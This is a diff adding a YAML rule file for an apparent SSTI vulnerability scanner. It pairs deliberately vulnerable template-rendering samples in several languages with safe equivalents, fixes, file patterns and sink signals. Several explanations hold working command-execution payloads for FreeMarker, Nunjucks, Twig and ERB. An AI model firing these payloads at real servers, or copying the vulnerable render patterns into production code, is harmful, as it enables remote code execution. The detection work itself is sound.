+      explanation: "templateContent from POST param becomes the FreeMarker template source. Attack: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}. CVE pattern: CVE-2022-22954 (VMware Workspace ONE, CVSS 9.8). Fix: Load templates from classpath; disable ?new() via TemplateClassResolver.ALLOWS_NOTHING."
+
+    - language: javascript
+      label: "Nunjucks renderString with user template"
+      code: |
+        app.post('/preview', (req, res) => {
+            const template = req.body.template;
+            const result = nunjucks.renderString(template, { data: getData() });
+            res.send(result);
+        });
+      explanation: "User-provided template string from POST body becomes the Nunjucks template source. Attack: template={{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}. Fix: nunjucks.render('preview.html', { data: getData(), userContent: template })."
+
+    - language: go
+      label: "text/template with user-controlled source"
+      code: |
+        func handler(w http.ResponseWriter, r *http.Request) {
+            userTemplate := r.FormValue("template")
+            tmpl, _ := template.New("t").Parse(userTemplate)
+            tmpl.Execute(w, data)
+        }
+      explanation: "User input from form value becomes the Go template source. html/template would auto-escape HTML output but still evaluate template expressions. Attack depends on methods available on data object. Fix: template.ParseFiles('template.html') with user data in Execute argument only."
+
+    - language: rust
+      label: "Tera render_str with user input (Axum)"
+      code: |
+        use axum::extract::Json;
+        use tera::{Tera, Context};
+
+        async fn preview(Json(payload): Json<PreviewRequest>) -> String {
+            let tera = Tera::default();
+            let mut ctx = Context::new();
+            ctx.insert("data", &get_data());
+            tera.render_str(&payload.template, &ctx).unwrap()
+        }
+      explanation: "User-provided template from JSON body becomes the Tera template source. Tera is Jinja2-compatible — expression evaluation applies. Fix: tera.add_raw_template('preview', &trusted_source); tera.render('preview', &ctx)."
+
+    - language: rust
+      label: "Tera one_off with format!() bridge"
+      code: |
+        use axum::extract::Query;
+        use tera::{Tera, Context};
+        use std::collections::HashMap;
+
+        async fn greet(Query(params): Query<HashMap<String, String>>) -> String {
+            let name = params.get("name").unwrap();
+            let template = format!("Hello {}!", name);
+            let ctx = Context::new();
+            Tera::one_off(&template, &ctx, true).unwrap()
+        }
+      explanation: "format!() inserts user input from query param into template source string passed to Tera::one_off(). This is the Rust format!() footgun applied to SSTI. Fix: let mut ctx = Context::new(); ctx.insert('name', name); Tera::one_off('Hello {{ name }}!', &ctx, true)."
+
+    - language: rust
+      label: "MiniJinja render_str with user input (Actix-web)"
+      code: |
+        use actix_web::{web, HttpResponse};
+        use minijinja::Environment;
+
+        async fn render_preview(body: web::Json<TemplateRequest>) -> HttpResponse {
+            let mut env = Environment::new();
+            let result = env.render_str(&body.template_content, minijinja::context! {
+                data => get_data(),
+            }).unwrap();
+            HttpResponse::Ok().body(result)
+        }
+      explanation: "User-provided template_content from JSON body becomes the MiniJinja template source. Fix: env.add_template('preview', &trusted_source); env.get_template('preview').unwrap().render(ctx)."
+
+    - language: php
+      label: "Twig createTemplate with user input"
+      code: |
+        $userTemplate = $_POST['template'];
+        $template = $twig->createTemplate($userTemplate);
+        echo $template->render(['data' => $data]);
+      explanation: "User POST data becomes the Twig template source. Attack: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}. CVE pattern: CVE-2020-12790. Fix: $twig->render('user_template.twig', ['data' => $data, 'userContent' => $userTemplate])."
+
+    - language: ruby
+      label: "ERB with user input as template"
+      code: |
+        def preview
+          template_content = params[:template]
+          result = ERB.new(template_content).result(binding)
+          render html: result.html_safe
+        end
+      explanation: "User input from params becomes the ERB template source with full binding access. Attack: template=<%= system('id') %>. ERB executes arbitrary Ruby code. Fix: ERB.new(File.read('preview.erb')).result(binding) with user data in context variables only."
+
+  safe:
+    - language: python
+      label: "File-based template with user data in context"
+      code: |
+        @app.route('/greeting')
+        def greeting():
+            name = request.args.get('name')
+            return render_template("greeting.html", name=name)
+        # greeting.html: <h1>Hello {{ name }}!</h1>
+      explanation: "User controls the value of 'name' but NOT the template structure. Template is loaded from a file — user input is data, not source. Safe."
+
+    - language: java
+      label: "FreeMarker template from classpath"
+      code: |
+        @GetMapping("/greeting")
+        public String greeting(@RequestParam String name, Model model) {
+            model.addAttribute("name", name);
+            return "greeting";  // resolves to greeting.ftlh from templates/
+        }
+      explanation: "Template loaded from classpath (greeting.ftlh file). User input in model as data only. Safe."
+
+    - language: javascript
+      label: "Nunjucks file-based render"
+      code: |
+        nunjucks.render("greeting.html", { name: req.query.name });
+      explanation: "Template loaded from file. User input in context data only. Safe."
+
+    - language: go
+      label: "Go template from file with data argument"
+      code: |
+        tmpl, _ := template.ParseFiles("templates/greeting.html")
+        tmpl.Execute(w, map[string]string{"Name": name})
+      explanation: "Template loaded from file. User data passed via Execute argument only. Safe."
+
+    - language: rust
+      label: "Tera file-based template with user data in context"
+      code: |
+        use tera::{Tera, Context};
+
+        async fn greeting(Query(params): Query<HashMap<String, String>>) -> String {
+            let tera = Tera::new("templates/**/*").unwrap();
+            let mut ctx = Context::new();
+            ctx.insert("name", params.get("name").unwrap());
+            tera.render("greeting.html", &ctx).unwrap()
+        }
+      explanation: "Template loaded from file (tera.render with template name). User input only in context (ctx.insert). Safe."
+
+    - language: rust
+      label: "Askama compile-time template (structurally immune)"
+      code: |
+        use askama::Template;
+
+        #[derive(Template)]
+        #[template(path = "greeting.html")]
+        struct GreetingTemplate<'a> {
+            name: &'a str,
+        }
+
+        async fn greeting(Query(params): Query<HashMap<String, String>>) -> impl IntoResponse {
+            let tmpl = GreetingTemplate { name: params.get("name").unwrap() };
+            Html(tmpl.render().unwrap())
+        }
+      explanation: "Askama templates compile to Rust code at build time. No runtime template parsing — SSTI is structurally impossible. This is the safest template pattern in any language."
+
+    - language: php
+      label: "Twig file-based render"
+      code: |
+        echo $twig->render("greeting.twig", ['name' => $_GET['name']]);
+      explanation: "Template loaded from file. User input in context data only. Safe."
+
+    - language: ruby
+      label: "ERB file-based template"
+      code: |
+        def greeting
+          @name = params[:name]
+          render template: "greeting"
+        end
+      explanation: "Template loaded from file by Rails. User input in instance variable for context data only. Safe."
+
+target_strategy:
+  scope: "function"
+  include_imports: true
+  include_type_defs: true
+  adaptive_depth:
+    small: "Deep analysis — trace all data flows from user input to every template rendering call. Check sandbox configs. Verify user-as-template-source vs user-as-template-data for every render call. (<20 files)"
+    medium: "Focus on route handlers that accept user input, template rendering modules, and files importing template engine APIs. Prioritize render_template_string, from_string, renderString, render_str, one_off, Parse(var) patterns. (20-200 files)"
+    large: "Surgical — grep for dangerous sinks (render_template_string, Template(, from_string(, render_str(, one_off(, renderString(, createTemplate(, ERB.new(, Parse(), then trace user input flow to those sinks. (200+ files)"
+  file_patterns:
+    - "**/*.py"
+    - "**/*.java"
+    - "**/*.js"
+    - "**/*.ts"
+    - "**/*.go"
+    - "**/*.rb"
+    - "**/*.php"
+    - "**/*.cs"
+    - "**/*.rs"
+    - "**/*.jinja2"
+    - "**/*.j2"
+    - "**/*.html.tera"
+    - "**/*.tera"
+    - "**/*.ftl"
+    - "**/*.ftlh"
+    - "**/*.vm"
+    - "**/*.pug"
+    - "**/*.ejs"
+    - "**/*.hbs"
+    - "**/*.erb"
+    - "**/*.twig"
+    - "**/*.njk"
+    - "**/*.liquid"
+    - "**/*.slim"
+    - "**/*.haml"
+  relevance_signals:
+    # Template rendering API imports and calls
+    - "render_template_string"
+    - "render_template"
+    - "from_string"
+    - "Template("
+    - "Environment("
+    - "SandboxedEnvironment"
+    - "template.Template"
+    - "tornado.template"
+    - "mako.template"
+    # Java template engines
+    - "FreeMarker"
+    - "freemarker"
+    - "Velocity"
+    - "VelocityEngine"
+    - "Thymeleaf"
+    - "thymeleaf"
+    - "SpringTemplateEngine"
+    - "PebbleEngine"
+    - "SpelExpressionParser"
+    # JavaScript template engines
+    - "ejs.render"
+    - "ejs.compile"
+    - "pug.render"
+    - "pug.compile"
+    - "nunjucks.renderString"
+    - "nunjucks.render"
+    - "Handlebars.compile"
+    - "handlebars.render"
+    # PHP template engines
+    - "createTemplate"
+    - "Twig"
+    - "Smarty"
+    - "Blade::render"
+    # Ruby template engines
+    - "ERB.new"
+    - "Slim::Template"
+    - "Liquid::Template"
+    # Go template packages
+    - "text/template"
+    - "html/template"
+    - "template.New"
+    - "template.Parse"
+    - "ParseFiles"
+    - "FuncMap"
+    # Rust template engines
+    - "tera::"
+    - "Tera::new"
+    - "Tera::one_off"
+    - "render_str"
+    - "minijinja::"
+    - "Environment::new"
+    - "template_from_str"
+    - "handlebars::"
+    - "Handlebars::new"
+    - "render_template"
+    - "askama::"
+    - "derive(Template)"
+    # C# template engines
+    - "RazorEngine"
+    - "Razor.RunCompile"
+    - "Scriban"
+    - "Template.Parse"
+    # Generic template signals
+    - "format!(\""
+    - "render("
+    - "compile("
+    - "template"
